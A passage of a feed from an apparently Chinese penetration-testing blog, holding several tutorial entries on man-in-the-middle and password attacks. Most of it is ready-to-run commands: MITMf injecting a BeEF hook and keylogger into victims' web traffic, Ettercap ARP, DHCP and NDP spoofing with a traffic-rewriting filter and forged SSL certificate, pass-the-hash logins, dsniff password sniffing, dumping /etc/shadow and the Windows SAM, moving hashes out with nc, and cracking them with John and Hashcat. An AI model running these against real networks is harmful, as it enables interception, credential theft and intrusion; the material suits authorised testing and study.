      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
    
    
      <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
    
      <category term="隧道" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93/"/>
    
      <category term="重定向" scheme="http://c.cat.plus/tags/%E9%87%8D%E5%AE%9A%E5%90%91/"/>
    
      <category term="Rinetd" scheme="http://c.cat.plus/tags/Rinetd/"/>
    
      <category term="monowall" scheme="http://c.cat.plus/tags/monowall/"/>
    
  </entry>
  
  <entry>
    <title>Mitmf中间人攻击结合beef框架XSS攻击</title>
    <link href="http://c.cat.plus/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    <id>http://c.cat.plus/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</id>
    <published>2015-05-26T11:23:36.000Z</published>
    <updated>2020-05-25T08:24:53.942Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a><strong>中间人攻击</strong></h3></blockquote><h4 id="注入XSS"><a href="#注入XSS" class="headerlink" title="注入XSS"></a><strong>注入XSS</strong></h4><ul><li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码</li><li>一旦得手，影响范围巨大</li><li>如果中间人发生在运营商线路上，很难引起用户注意</li></ul><h4 id="Mitmf-安装"><a href="#Mitmf-安装" class="headerlink" title="Mitmf 安装"></a><strong>Mitmf</strong> 安装</h4><ul><li>曾经号称最好用的中间人攻击工具(kali 2.0后默认未安装)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</span><br><span class="line">apt-get install mitmf</span><br><span class="line">pip uninstall twisted</span><br><span class="line">wget http:&#x2F;&#x2F;twistedmatrix.com&#x2F;Releases&#x2F;Twisted&#x2F;15.5&#x2F;Twisted15.5.0.tar.bz2</span><br><span class="line">pip install .&#x2F;Twisted-15.5.0.tar.bz2</span><br></pre></td></tr></table></figure></li><li>启动beef<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;beef-xss&#x2F;</span><br><span class="line">.&#x2F;beef</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">* mitmf中间人注入xss脚本</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 1.1.1.1 --target 1.1.1.2 --inject --js-url http:&#x2F;&#x2F;1.1.1.3:3000&#x2F;hook.js</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</span><br><span class="line"></span><br><span class="line">--upsidedownternet、--screen(&#x2F;var&#x2F;log&#x2F;mitmf)#颠倒图片及屏幕快照</span><br><span class="line">--ferretng（cookie）、--browserprofiler(浏览器及插件信息)#嗅探cookie及浏览器插件信息</span><br><span class="line">--smbtrap、--smbauth#smb身份认证信息嗅探</span><br><span class="line"></span><br><span class="line">--hsts#协议降级攻击</span><br><span class="line">HTTP Strict Transport Security</span><br><span class="line">防止协议降级、cookie窃取</span><br><span class="line">安全策略通过HTTP响应头”Strict-Transport-Security“实施</span><br><span class="line">限制user-agent、https等</span><br><span class="line"></span><br><span class="line">--filepwn </span><br><span class="line">凌空插后门,传输过程中插入后门</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;中间人攻击&quot;&gt;&lt;a href=&quot;#中间人攻击&quot; class=&quot;headerlink&quot; title=&quot;中间人攻击&quot;&gt;&lt;/a&gt;&lt;strong&gt;中间人攻击&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
&lt;h4 id=&quot;注入XSS&quot;&gt;&lt;a
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="密码攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
    
      <category term="嗅探欺骗" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E5%97%85%E6%8E%A2%E6%AC%BA%E9%AA%97/"/>
    
    
      <category term="arpspoof" scheme="http://c.cat.plus/tags/arpspoof/"/>
    
      <category term="dnsspoof" scheme="http://c.cat.plus/tags/dnsspoof/"/>
    
      <category term="Mitmf" scheme="http://c.cat.plus/tags/Mitmf/"/>
    
      <category term="XSS" scheme="http://c.cat.plus/tags/XSS/"/>
    
      <category term="beef" scheme="http://c.cat.plus/tags/beef/"/>
    
  </entry>
  
  <entry>
    <title>Ettercap中间人攻击</title>
    <link href="http://c.cat.plus/2015/05/26/Password_Attacks/Ettercap%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    <id>http://c.cat.plus/2015/05/26/Password_Attacks/Ettercap%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</id>
    <published>2015-05-26T11:23:36.000Z</published>
    <updated>2020-05-25T08:35:02.262Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="Ettercap"><a href="#Ettercap" class="headerlink" title="Ettercap"></a><strong>Ettercap</strong></h3></blockquote><ul><li>统一的中间人攻击工具</li><li>转发MAC与本机相同，但IP与本机不同的数据包</li><li>支持SSH1、SSL中间人攻击<h4 id="模块划分"><a href="#模块划分" class="headerlink" title="模块划分"></a><strong>模块划分</strong></h4></li><li>Snifer</li><li>MITM</li><li>Filter</li><li>Log </li><li>Plugin</li></ul><h5 id="Snifer"><a href="#Snifer" class="headerlink" title="Snifer"></a><strong>Snifer</strong></h5><p>负责数据包转发<br><strong>Unified</strong></p><ul><li>单网卡情况下独立完成三层包转发</li><li>始终禁用内核IP_Forward功能</li><li><em>Bridge*</em></li><li>双网卡情况下的一层MITM模式</li><li>可作为IPS过滤数据包</li><li>不可在网关上使用(透明网桥)<h5 id="MITM"><a href="#MITM" class="headerlink" title="MITM"></a><strong>MITM</strong></h5></li><li>把流量重定向到ettercap主机上</li><li>可以使用其他工具实现MITM，ettercap之作嗅探和过滤使用</li><li><em>实现MITM的方法*</em></li><li>ARP</li><li>ICMP<br>  ICMP路由重定向，半双工</li><li>DHCP<br>  修改网关地址,半双工<br>  Switch Port Stealing    #交换机端口窃取<br>  flood目标地址是本机，源地址是受害者的包<br>  适用于ARP静态绑定的环境</li><li>NDP<br>  IPv6协议欺骗技术</li></ul><p><strong>2.4以上内核对ARP地址欺骗的约束</strong></p><ul><li>收到非请求的ARP响应包，不更新本地ARP缓存</li><li>Ettercap使用ARP request包进行攻击</li><li><em>Solaris 不根据ARP包更新本地ARP缓存*</em></li><li>Ettercap使用先发ICMP包来更新ARP缓存</li></ul><p><strong>用户操作界面</strong><br>    -T 字符模式界面<br>    -G 图形界面<br>    -C 基于字符的图形界面<br>    -D 后台模式</p><p><strong>指定目标</strong></p><pre><code>IPv4：MAC/IPs/PortsIPv6：MAC/IPs/IPv6/Ports/10.0.0.1-5;10.0.1.33/20-25,80,110</code></pre><p><strong>权限</strong></p><ul><li>需要root权限打开链路层Socket连接,然后使用nobody账号运行</li><li>日志写入目录需要nobody有写入权</li><li>修改etter.conf：EC_UID=65534        #改为0</li></ul><p><strong>基于伪造证书的SSL MITIM</strong></p><pre><code>Bridge模式不支持SSL MITM 需要生成SSL证书openssl genrsa -out etter.ssl.crt 1024openssl req -new-keyetter.ssl.crt -out tmp.csropenssl x509 -req -days 1825 -in tmp.csr -signkey etter.ssl.crt -out tmp.newcat tmp.new&gt;&gt;etter.ssl.crtrm −f tmp.newtmp.csr</code></pre><h3 id="ARP-MITM"><a href="#ARP-MITM" class="headerlink" title="ARP MITM"></a><strong>ARP MITM</strong></h3><p><strong>字符模式</strong></p><pre><code>ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -F 1.ef -P autoadd -w a.cap -l loginfo -L logall -m message</code></pre><p><strong>图形界面</strong></p><h5 id="SSL-MITM"><a href="#SSL-MITM" class="headerlink" title="SSL MITM"></a><strong>SSL MITM</strong></h5><p><code>vi /etc/ettercap/etter.conf</code></p><h5 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a><strong>DNS欺骗</strong></h5><p>dns_spoof插件配置文件<br>    <code>vi /etc/ettercap/etter.dns</code></p><h4 id="Ettercap-日志查看"><a href="#Ettercap-日志查看" class="headerlink" title="Ettercap 日志查看"></a><strong>Ettercap 日志查看</strong></h4><pre><code>etterlog -p log.eci     #查看获取的密码etterlog -c log.ecp     #列出Log中的连接etterlog -c -f /1.1.1.1/ log.ecpetterlog -B -n -s -F TCP:1.1.1.1:20:1.1.1.2:1234 log.ecp &gt; aa     #选择相应的连接并榨取文件</code></pre><h4 id="Filter-过滤器"><a href="#Filter-过滤器" class="headerlink" title="Filter    过滤器"></a><strong>Filter</strong>    过滤器</h4><pre><code>ls /usr/share/ettercap/SSH-2.xx / SSH-1.99 / SSH-1.51etterfilter etter.filter.ssh -o ssh.ef        #编译可执行二进制文件,-F 作SSH嗅探</code></pre><h5 id="替换HTTP内容"><a href="#替换HTTP内容" class="headerlink" title="替换HTTP内容"></a>替换HTTP内容</h5><ul><li>替换图片</li><li>替换exe后门程序<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (ip.proto &#x3D;&#x3D; TCP &amp;&amp; tcp.src &#x3D;&#x3D; 80) &#123;</span><br><span class="line">msg(&quot;data on TCP 80\n&quot;);</span><br><span class="line">replace(&quot;img src&#x3D;&quot;, &quot;img src&#x3D;\&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;1.gif\&quot; &quot;);</span><br><span class="line">replace(&quot;IMG src&#x3D;&quot;, &quot;img src&#x3D;\&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;1.gif\&quot; &quot;);</span><br><span class="line">replace(&quot;IMG SRC&#x3D;&quot;, &quot;img src&#x3D;\&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;1.gif\&quot; &quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="ICMP-中间人攻击"><a href="#ICMP-中间人攻击" class="headerlink" title="ICMP 中间人攻击"></a><strong>ICMP 中间人攻击</strong></h4><pre><code>-M icmp:00:11:22:33:44:55/10.0.0.1        #真实网关的MAC/IP</code></pre><h4 id="DHCP-中间人攻击"><a href="#DHCP-中间人攻击" class="headerlink" title="DHCP 中间人攻击"></a><strong>DHCP 中间人攻击</strong></h4><pre><code>−M dhcp:192.168.0.30,35,50−60/255.255.255.0/192.168.0.1        #DNS </code></pre><h4 id="Port-基于交换机端口窃取的中间人攻击"><a href="#Port-基于交换机端口窃取的中间人攻击" class="headerlink" title="Port 基于交换机端口窃取的中间人攻击"></a><strong>Port 基于交换机端口窃取的中间人攻击</strong></h4><pre><code>-M port /1.1.1.1/ /1.1.1.2/</code></pre><h4 id="Ndp-IPv6协议欺骗中间人攻击"><a href="#Ndp-IPv6协议欺骗中间人攻击" class="headerlink" title="Ndp IPv6协议欺骗中间人攻击"></a><strong>Ndp</strong> IPv6协议欺骗中间人攻击</h4><pre><code>-M ndp //fe80::260d:afff:fe6e:f378/ //2001:db8::2:1/</code></pre><h3 id="Pass-the-Hash-PTH"><a href="#Pass-the-Hash-PTH" class="headerlink" title="Pass the Hash (PTH)"></a><strong>Pass the Hash</strong> (PTH)</h3><ul><li>密码破解耗费时间资源巨大</li><li>使用密文提交给服务器直接完成身份认证</li><li>NTLM/LM是没有加盐的静态HASH密文</li><li>企业中使用ghost等工具克隆安装系统</li></ul><h4 id="利用sam-hash密文远程登录windows"><a href="#利用sam-hash密文远程登录windows" class="headerlink" title="利用sam hash密文远程登录windows"></a><strong>利用sam hash密文远程登录windows</strong></h4><pre><code>pth-winexe -U w7%aad3b435b51404eeaad3b435b51404ee:ed1bfaeb3063 716ab7fe2a11faf126d8 //1.1.1.1 cmd</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;Ettercap&quot;&gt;&lt;a href=&quot;#Ettercap&quot; class=&quot;headerlink&quot; title=&quot;Ettercap&quot;&gt;&lt;/a&gt;&lt;strong&gt;Ettercap&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
&lt;ul&gt;

      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="密码攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
    
      <category term="嗅探欺骗" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E5%97%85%E6%8E%A2%E6%AC%BA%E9%AA%97/"/>
    
    
      <category term="arpspoof" scheme="http://c.cat.plus/tags/arpspoof/"/>
    
      <category term="dnsspoof" scheme="http://c.cat.plus/tags/dnsspoof/"/>
    
      <category term="Ettercap" scheme="http://c.cat.plus/tags/Ettercap/"/>
    
      <category term="PTH" scheme="http://c.cat.plus/tags/PTH/"/>
    
      <category term="中间人攻击" scheme="http://c.cat.plus/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>使用ARP和DNS欺骗实现流量劫持密码嗅探</title>
    <link href="http://c.cat.plus/2015/05/26/Password_Attacks/ARP%E6%AC%BA%E9%AA%97%E5%92%8CDNS%E6%AC%BA%E9%AA%97%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2/"/>
    <id>http://c.cat.plus/2015/05/26/Password_Attacks/ARP%E6%AC%BA%E9%AA%97%E5%92%8CDNS%E6%AC%BA%E9%AA%97%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2/</id>
    <published>2015-05-25T21:53:13.000Z</published>
    <updated>2020-05-25T08:43:39.062Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="ARP欺骗-网络密码嗅探"><a href="#ARP欺骗-网络密码嗅探" class="headerlink" title="ARP欺骗-网络密码嗅探"></a><strong>ARP欺骗-网络密码嗅探</strong></h3></blockquote><p><strong>二层地址和三层地址</strong> MAC硬件地址&amp;IP地址</p><ul><li>IP 网络到网络</li><li>MAC 主机到主机</li></ul><h4 id="交换机与HUB"><a href="#交换机与HUB" class="headerlink" title="交换机与HUB"></a><strong>交换机与HUB</strong></h4><ul><li>交换机是二层设备,HUB是一层设备</li><li>HUB全端口转发</li><li>交换机根据学习地址转发</li><li>混杂模式抓包</li></ul><h4 id="ARP协议-地址解析协议"><a href="#ARP协议-地址解析协议" class="headerlink" title="ARP协议 地址解析协议"></a><strong>ARP协议</strong> 地址解析协议</h4><ul><li>把IP地址解析对应的MAC地址</li><li>免费ARP</li><li>基于广播学习</li><li>以太网头、ARP头</li><li>请求 <strong>响应</strong> 相对独立</li><li>基于传闻的协议</li><li>手动修改数据包实现ARP欺骗</li></ul><h4 id="arpspoof"><a href="#arpspoof" class="headerlink" title="arpspoof"></a><strong>arpspoof</strong></h4><pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward         #开启路由转发功能,使被欺骗者可上网arpspoof -t 1.1.1.12 -r 1.1.1.1            #欺骗用户和网关,双向欺骗实现中间人攻击</code></pre><h4 id="网络抓包嗅探"><a href="#网络抓包嗅探" class="headerlink" title="网络抓包嗅探"></a><strong>网络抓包嗅探</strong></h4><pre><code>driftnet -i eth0 -a -d tempdir -s        #抓包还原图片和音频并保存指定目录urlsnarf -i eth0                        #嗅探urlwebspy -i eth0 1.1.1.10                    #嗅探url,工具有BUGdsniff -i eth0 -m                        #嗅探密码    cat /usr/share/dsniff/dsniff.services    #查看支持协议类型解码dnsspoof -i eth0 -f /usr/share/dsniff/dnsspoof.hosts        #dns欺骗</code></pre><h4 id="DNS欺骗代理"><a href="#DNS欺骗代理" class="headerlink" title="DNS欺骗代理"></a><strong>DNS欺骗代理</strong></h4><pre><code>dnschef --fakeip=1.1.1.10 -fakedomains=www.google.com,www.youtube.com --interface 1.1.1.2 -q将被害者DNS指向伪造的DNS服务器</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;ARP欺骗-网络密码嗅探&quot;&gt;&lt;a href=&quot;#ARP欺骗-网络密码嗅探&quot; class=&quot;headerlink&quot; title=&quot;ARP欺骗-网络密码嗅探&quot;&gt;&lt;/a&gt;&lt;strong&gt;ARP欺骗-网络密码嗅探&lt;/strong&gt;&lt;/h3&gt;&lt;/b
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="密码攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
    
      <category term="嗅探欺骗" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E5%97%85%E6%8E%A2%E6%AC%BA%E9%AA%97/"/>
    
    
      <category term="arpspoof" scheme="http://c.cat.plus/tags/arpspoof/"/>
    
      <category term="driftnet" scheme="http://c.cat.plus/tags/driftnet/"/>
    
      <category term="dsniff" scheme="http://c.cat.plus/tags/dsniff/"/>
    
      <category term="dnsspoof" scheme="http://c.cat.plus/tags/dnsspoof/"/>
    
  </entry>
  
  <entry>
    <title>John离线密码破解及Ophcrack彩虹表密码破解</title>
    <link href="http://c.cat.plus/2015/05/24/Password_Attacks/John%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E5%8F%8AOphcrack%20%E5%BD%A9%E8%99%B9%E8%A1%A8%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    <id>http://c.cat.plus/2015/05/24/Password_Attacks/John%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E5%8F%8AOphcrack%20%E5%BD%A9%E8%99%B9%E8%A1%A8%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</id>
    <published>2015-05-23T22:55:33.000Z</published>
    <updated>2020-05-25T07:51:29.694Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="John-离线密码破解"><a href="#John-离线密码破解" class="headerlink" title="John 离线密码破解"></a><strong>John</strong> 离线密码破解</h3></blockquote><ul><li>支持众多服务应用的加密破解<br>   <code>john --list=formats</code></li><li>支持某些对称加密算法破解<h4 id="模式"><a href="#模式" class="headerlink" title="模式"></a><strong>模式</strong></h4></li><li>Wordlist：基于规则的字典破解 </li><li>Single crack:默认被首先执行，使用Login/GECOS信息尝试破解<br>  修改GECOS: <code>chfn -f usernamefull -r room_301 -w 12345 -h 12345 -o penetration cat</code></li><li>Incremental:增量,所有或指定字符集的暴力破解</li><li>External：需要在主配配文件中用C语言子集编程<h5 id="默认破解模式"><a href="#默认破解模式" class="headerlink" title="默认破解模式"></a><strong>默认破解模式</strong></h5></li><li>Single、wordlist、incremental</li><li>主配置文件中指定默认wordlist</li></ul><h4 id="破解Linux系统账号密码"><a href="#破解Linux系统账号密码" class="headerlink" title="破解Linux系统账号密码"></a><strong>破解Linux系统账号密码</strong></h4><pre><code>unshadow /etc/passwd /etc/shadow &gt; pass.txt        #合并系统账号及密码并输出到文件john pass.txt     #执行破解john --show pass         #查看破解结果</code></pre><h4 id="破解windows密码"><a href="#破解windows密码" class="headerlink" title="破解windows密码"></a><strong>破解windows密码</strong></h4><pre><code>john sam.dump --wordlist=password.lst --format=ntjohn sam.dump --format=nt --show    #查看破解结果</code></pre><h4 id="Johnny-图形化界面的john"><a href="#Johnny-图形化界面的john" class="headerlink" title="Johnny 图形化界面的john"></a><strong>Johnny 图形化界面的john</strong></h4><pre><code>johnny</code></pre><p>example:<br><img src="https://github.com/iseanhe/iseanhe.github.io/raw/master/img/mdphotos/johnny.png" alt="johnny"></p><blockquote><h3 id="Ophcrack-离线密码破解"><a href="#Ophcrack-离线密码破解" class="headerlink" title="Ophcrack 离线密码破解"></a><strong>Ophcrack</strong> 离线密码破解</h3></blockquote><ul><li>基于彩虹表的LM、NTLM密码破解软件</li><li>彩虹表: <code>http://ophcrack.sourceforge.net/tables.php</code><br><img src="https://github.com/iseanhe/iseanhe.github.io/raw/master/img/mdphotos/Ophcrack.png" alt="Ophcrack"><br>在线密码破解</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;John-离线密码破解&quot;&gt;&lt;a href=&quot;#John-离线密码破解&quot; class=&quot;headerlink&quot; title=&quot;John 离线密码破解&quot;&gt;&lt;/a&gt;&lt;strong&gt;John&lt;/strong&gt; 离线密码破解&lt;/h3&gt;&lt;/block
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="密码攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
    
      <category term="暴力破解" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="离线密码破解" scheme="http://c.cat.plus/tags/%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="John" scheme="http://c.cat.plus/tags/John/"/>
    
      <category term="彩虹表" scheme="http://c.cat.plus/tags/%E5%BD%A9%E8%99%B9%E8%A1%A8/"/>
    
      <category term="Ophcrack" scheme="http://c.cat.plus/tags/Ophcrack/"/>
    
      <category term="Linux密码破解" scheme="http://c.cat.plus/tags/Linux%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="Windows密码" scheme="http://c.cat.plus/tags/Windows%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>Hash识别及Hashcat离线密码破解</title>
    <link href="http://c.cat.plus/2015/05/23/Password_Attacks/Hashcat%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    <id>http://c.cat.plus/2015/05/23/Password_Attacks/Hashcat%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</id>
    <published>2015-05-23T12:35:53.000Z</published>
    <updated>2020-05-25T07:42:49.002Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="离线密码破解"><a href="#离线密码破解" class="headerlink" title="离线密码破解"></a>离线密码破解</h3></blockquote><h4 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h4><ul><li>禁止明文传输密码</li><li>每次认证使用HASH算法加密密码传输(HASH算法加密容易、解密困难)</li><li>服务器端用户数据库应加盐加密保存</li></ul><h4 id="破解思路"><a href="#破解思路" class="headerlink" title="破解思路"></a>破解思路</h4><ul><li>嗅探获取密码HASH</li><li>利用漏洞登陆服务器并从用户数据库获取密码HASH</li><li>识别HASH类型<br>  长度、字符集</li><li>利用离线破解工具碰撞密码HASH</li></ul><h4 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h4><ul><li>离线不会触发密码锁定机制</li><li>不会产生大量登陆失败日志引起管理员注意</li></ul><blockquote><h4 id="HASH识别工具"><a href="#HASH识别工具" class="headerlink" title="HASH识别工具"></a>HASH识别工具</h4></blockquote><ul><li><code>hash‐identifier</code></li><li><code>Hashid</code></li><li>可能识别错误或无法识别</li></ul><blockquote><h4 id="Windows-HASH获取工具"><a href="#Windows-HASH获取工具" class="headerlink" title="Windows HASH获取工具"></a>Windows HASH获取工具</h4></blockquote><ul><li>利用漏洞：<code>Pwdump</code>,<code>fgdump</code>,<code>mimikatz</code>,<code>wce</code> </li><li>物理接触：<code>samdump2</code></li><li>Kali ISO 启动虚拟机 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fdesk -l</span><br><span class="line">mount &#x2F;dev&#x2F;sda1 &#x2F;mnt</span><br><span class="line">cd &#x2F;mnt&#x2F;Windows&#x2F;System32&#x2F;config</span><br><span class="line">samdump2 SYSTEM SAM -o sam.hash</span><br></pre></td></tr></table></figure></li><li>利用nc传输HASH<pre><code>nc -nvlp 333nc 192.168.190.128 333</code></pre><h4 id="Windows系统syskey加密工具"><a href="#Windows系统syskey加密工具" class="headerlink" title="Windows系统syskey加密工具"></a><strong>Windows系统syskey加密工具</strong></h4></li><li>cmd:<code>syskey</code></li><li>使用Bootkey利用RC4算法加密SAM数据库</li><li>Bootkey保存于SYSTEM文件中</li></ul><p><strong>Bkhive</strong></p><ul><li><p>从SYSTEM文件中提取bootkey </p></li><li><p>Kali 2.0 抛弃了bkhive </p><p>  apt-get purge samdump2    #卸载samdump2<br>  编译安装:<code>http://http.us.debian.org/debian/pool/main/b/bkhive/</code><br>  make<br>  make install<br>  bkhive SYSTEM key<br>  samdump2 SAM key  (版本已更新，不再支持此功能)<br>  建议使用 Kali 1.x</p></li></ul><blockquote><h4 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a><strong>Hashcat</strong></h4></blockquote><p>开源多线程密码破解工具<br>支持80多种加密算法破解<br>基于CPU的计算能力破解<br>六种模式 </p><ol start="0"><li>Straight：字典破解</li><li>Combination：将字典中密码进行组合(1 2 &gt; 11 22 12 21)</li><li>Toggle case：尝试字典中所有密码的大小写字母组合</li><li>Brute force：指定字符集(或全部字符集)所有组合</li><li>Permutation：字典中密码的全部字符置换组合(12 21)</li><li>Table-lookup：程序为字典中所有密码自动生成掩码</li></ol><p><strong>命令</strong></p><pre><code>hashcat -bhashcat -m 100 hash.dump pass.lsthashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l?l?l?d?d结果：hashcat.pothashcat -m 100 -a 3 hash -i --increment-min 6 --increment-max 8 ?l?l?l?l?l?l?l?l?l = abcdefghijklmnopqrstuvwxyz?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ?d = 0123456789?s =  !&quot;#$%&amp;&apos;()*+,-./:;&lt;=&gt;?@[\]^_`{|}~?a = ?l?u?d?s?b = 0x00 - 0xff</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;离线密码破解&quot;&gt;&lt;a href=&quot;#离线密码破解&quot; class=&quot;headerlink&quot; title=&quot;离线密码破解&quot;&gt;&lt;/a&gt;离线密码破解&lt;/h3&gt;&lt;/blockquote&gt;
&lt;h4 id=&quot;身份认证&quot;&gt;&lt;a href=&quot;#身份认证&quot; 
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="密码攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
    
      <category term="暴力破解" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
    
